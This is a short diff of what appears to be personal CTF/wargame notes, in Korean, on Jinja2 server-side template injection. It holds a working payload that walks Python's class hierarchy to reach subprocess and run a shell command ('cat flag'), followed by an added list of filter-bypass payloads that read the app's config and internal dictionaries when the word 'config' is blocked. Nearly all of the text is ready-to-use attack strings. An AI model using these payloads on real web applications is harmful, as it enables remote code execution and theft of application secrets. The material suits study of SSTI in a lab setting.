@@ -21,4 +21,15 @@
 
 {{ ''.__class__.__mro__[1].__subclasses__()[245]('cat flag',shell=True,stdout=-1).communicate() }}
 #FLAG{Wargame_SSTI_Problem}
-출처: https://dohunny.tistory.com/20 [9ucc1 is Studying...:티스토리]
+----------------------------------------------------------------------------------------------------
+
+# config가 필터링 되는 경우
+{{ self.__dict__ }}
+{{ self['__dict__']}}
+{{ self|attr("__dict__") }}
+{{ self|attr("con"+"fig")}}
+{{ self.__getitem__('con'+'fig') }}
+{{ request.__dict__ }}
+{{ request['__dict__']}}
+{{ request.__getitem__('con'+'fig') }}
+
